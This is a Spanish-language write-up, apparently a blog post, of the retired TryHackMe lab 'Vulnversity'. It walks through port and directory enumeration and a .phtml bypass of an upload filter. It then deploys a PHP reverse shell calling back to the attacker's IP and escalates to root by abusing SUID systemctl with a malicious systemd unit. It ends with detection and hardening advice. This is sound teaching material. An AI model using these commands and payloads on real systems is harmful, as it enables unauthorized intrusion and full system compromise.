@@ -1,0 +1,207 @@
+---
+title: Vulnversity
+summary: Servidor web en un puerto alto con un formulario de subida. Salto la lista negra de extensiones con .phtml (encontrada con Burp Intruder), consigo una reverse shell como www-data y escalo a root abusando de /bin/systemctl con SUID.
+date: 2026-11-06
+platform: thm
+os: linux
+difficulty: easy
+retired: true
+cover: ./vulnversity.png
+coverAlt: "Esquema de la máquina Vulnversity: a la izquierda Kali (192.168.143.255) sube por HTTP una reverse shell .phtml que salta el filtro de extensiones; a la derecha el equipo Vulnversity (10.130.175.65), con una flecha de escalada a root abusando de /bin/systemctl con SUID."
+techniques: [file-upload-bypass, reverse-shell, suid-privesc]
+tools: [nmap, gobuster, burpsuite, netcat, python]
+tags: [linux, web, php, file-upload, suid]
+draft: false
+---
+
+## Resumen
+
+Vulnversity es un Linux fácil con la receta clásica de la web: enumerar, encontrar un formulario de subida, saltar el filtro de extensiones y escalar con un binario SUID mal puesto. El giro está al final: el SUID no es un intérprete, sino `/bin/systemctl`, y se abusa registrando un servicio de systemd que corre como root.
+
+| Campo | Valor |
+| --- | --- |
+| IP objetivo | `10.130.175.65` |
+| Servicio web | Apache en el puerto `3333` |
+| Vector de entrada | Subida de ficheros en `/internal/` |
+| Acceso inicial | `www-data` por una reverse shell `.phtml` |
+| Escalada | `/bin/systemctl` con SUID de root |
+
+La cadena completa:
+
+1. Escaneo de puertos: la web no está en el 80, sino en el `3333`.
+2. Fuzzing de directorios con gobuster: el directorio `/internal/` tiene un formulario de subida.
+3. Bypass del filtro de extensiones con **Burp Intruder**: `.phtml` pasa.
+4. Subo una reverse shell `.phtml` y entro como `www-data`.
+5. Enumeración de binarios SUID: `/bin/systemctl`.
+6. Servicio de systemd malicioso que me deja una bash con SUID → root.
+
+## Reconocimiento
+
+Escaneo completo de puertos con versiones y scripts por defecto:
+
+```bash
+nmap -sC -sV -p- -T4 10.130.175.65 -oN vulnversity.txt
+```
+
+| Puerto | Servicio | Nota |
+| --- | --- | --- |
+| 21/tcp | FTP | vsftpd |
+| 22/tcp | SSH | OpenSSH |
+| 139, 445/tcp | SMB | Samba |
+| 3128/tcp | HTTP proxy | Squid |
+| **3333/tcp** | **HTTP** | **Apache: el servidor web principal** |
+
+El detalle que marca el ataque: el servidor web **no está en el 80**, sino en el `3333`. Es un recordatorio de por qué el primer escaneo va siempre a todos los puertos (`-p-`) y no solo a los habituales; con un escaneo rápido de los 1000 primeros, esta web no habría aparecido. SSH y FTP sin credenciales se quedan aparcados; el vector es la web.
+
+## Enumeración web (puerto 3333)
+
+La portada es la página por defecto de Apache, sin nada a la vista, así que fuzzeo directorios:
+
+```bash
+gobuster dir -u http://10.130.175.65:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+```
+
+```text
+/images     (Status: 301)
+/css        (Status: 301)
+/internal   (Status: 301)   <-- interesante
+```
+
+En `http://10.130.175.65:3333/internal/` hay un **formulario de subida de ficheros**. Si consigo subir un `.php` y que Apache lo ejecute, tengo RCE. Todo el reto está, otra vez, en el filtro de extensiones.
+
+## Subida de ficheros: bypass con `.phtml`
+
+El formulario rechaza `.php`, así que hay que averiguar **qué extensiones sí acepta**. En vez de probarlas a mano, automatizo con **Burp Intruder**:
+
+1. Con el navegador pasando por el proxy de Burp, subo un fichero cualquiera y capturo la petición `POST` a `/internal/upload.php`.
+2. La mando a Intruder (`Ctrl+I`) y uso el modo **Sniper** (un único punto de inyección).
+3. Marco la extensión del nombre del fichero como posición del payload:
+
+```http
+Content-Disposition: form-data; name="file"; filename="shell.§php§"
+```
+
+4. Como lista de payloads, las extensiones de PHP que suelen olvidarse en las listas negras:
+
+```text
+.php
+.php3
+.php4
+.php5
+.phtml
+```
+
+Al lanzar el ataque, comparo el mensaje (o la longitud) de cada respuesta: todas devuelven "extensión no permitida" **salvo `.phtml`**, que es aceptada. Igual que `.php5`, `.phtml` es una extensión que Apache también interpreta como PHP pero que se cuela por los filtros en lista negra; por eso, ante una subida, nunca hay que rendirse con `.php` a secas. Lo explico más a fondo en la nota de la biblia sobre [subida de ficheros y webshells](/biblia/comandos/?q=webshell).
+
+## Acceso inicial: reverse shell
+
+Con una extensión válida, subo directamente una reverse shell en vez de una webshell. Uso la de PentestMonkey, que viene en Kali:
+
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
+```
+
+Edito las dos variables para que apunte a mi Kali:
+
+```php
+$ip = '192.168.143.255';   // IP atacante
+$port = 1234;              // puerto del listener
+```
+
+Monto el listener:
+
+```bash
+nc -lvnp 1234
+```
+
+Subo `shell.phtml` por el formulario de `/internal/` y la disparo pidiéndola por la URL donde caen los ficheros subidos:
+
+```text
+http://10.130.175.65:3333/internal/uploads/shell.phtml
+```
+
+Al cargarla, el PHP se ejecuta y recibo la conexión como `www-data`. La shell llega sin TTY, así que la estabilizo (el porqué de cada paso, en la nota de [reverse shells y estabilización](/biblia/shells/reverse-shells/)):
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z y, en Kali:
+stty raw -echo; fg
+# de vuelta en la shell:
+export TERM=xterm
+```
+
+La flag de usuario está en el `home` de bill:
+
+```bash
+cat /home/bill/user.txt
+```
+
+## Escalada de privilegios: SUID en `systemctl`
+
+Como `www-data`, busco binarios con el bit SUID de root:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Entre los habituales aparece uno que **no debería** tenerlo:
+
+```text
+/bin/systemctl
+```
+
+Un SUID de root que no es un intérprete, pero que escala igual de bien. Lo confirmo en [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) y tiro de la misma metodología de la nota de [abuso de permisos SUID](/biblia/privesc-linux/suid/).
+
+### Por qué funciona
+
+`systemctl` no ejecuta los servicios por sí mismo: le pide a **systemd** (el PID 1, que corre como root) que los gestione. Un servicio sin la directiva `User=` se ejecuta como root. Si puedo registrar y arrancar un servicio propio —y el `systemctl` con SUID me deja hacerlo con privilegios—, systemd ejecutará como root el comando que yo le ponga. No necesito explotar nada más: uso el sistema de servicios tal como está diseñado, solo que con un `systemctl` que no debería ser SUID.
+
+### Explotación
+
+Creo el fichero de unidad. La línea `ExecStart=` va **dentro** del `.service`, no se teclea en la shell; uso un *heredoc* para escribir el fichero entero de una vez:
+
+```bash
+cat > /tmp/root.service <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+- `Type=oneshot`: ejecuta el comando y termina, no es un demonio.
+- `ExecStart=`: lo que systemd correrá como root. Como no pasa por una shell, lo envuelvo en `/bin/sh -c "..."` para encadenar comandos.
+- El payload copia `/bin/bash` a `/tmp/rootbash` y le pone el bit SUID.
+
+Enlazo, habilito y arranco el servicio:
+
+```bash
+systemctl link /tmp/root.service
+systemctl enable --now /tmp/root.service
+```
+
+`link` crea el symlink en `/etc/systemd/system/`; `enable --now` lo habilita y lo arranca en el momento. Ahora tengo una copia de bash con SUID de root. La abro conservando el privilegio:
+
+```bash
+/tmp/rootbash -p
+```
+
+El flag `-p` es imprescindible: sin él, bash descarta el UID efectivo de root que le da el SUID (lo mismo que con el `sh -p` de la escalada por python). Con `id` ya aparece `euid=0` y la flag final está en `/root/`:
+
+```bash
+cat /root/root.txt
+```
+
+## Cómo se detecta y se corrige
+
+- **Subida de ficheros**: validar con **lista blanca** de extensiones y comprobar el tipo real (los *magic bytes*), nunca el `Content-Type` ni el nombre que manda el cliente. Guardar las subidas con nombre aleatorio y **fuera del webroot**, o en un directorio donde el intérprete esté apagado. Quitar de Apache el mapeo de `.phtml`, `.php3`, `.php4` y `.php5` si no se usan. Como detección: ficheros `.ph*` nuevos en `/internal/uploads/` y peticiones a esa carpeta.
+- **SUID en `systemctl`**: nunca debería tenerlo. Auditar los SUID de forma periódica (`find / -perm -4000`) y quitar el bit con `chmod u-s`. Vigilar con auditd los *symlinks* nuevos en `/etc/systemd/system/` que apunten a rutas escribibles como `/tmp` o `/dev/shm`: son la firma de este abuso.
+- **Mínimo privilegio**: el usuario del servidor web (`www-data`) no tiene por qué poder gestionar servicios del sistema.
+
+## Lo que me llevo
+
+- Escanea **todos** los puertos desde el principio: la web del 3333 no sale en un escaneo rápido, y sin ella no hay máquina.
+- Un filtro de subida en lista negra casi nunca es completo; Burp Intruder en modo Sniper prueba las extensiones alternativas (`.phtml`, `.php5`, `.pht`) en segundos.
+- GTFOBins no es solo intérpretes: `systemctl`, `find`, `cp` y muchos binarios "normales" escalan con SUID. Enumerar los SUID (`find / -perm -4000`) sigue siendo lo primero tras pisar una shell de Linux.
+- El `-p` otra vez: cualquier shell lanzada desde un SUID descarta el privilegio si no se lo pides.
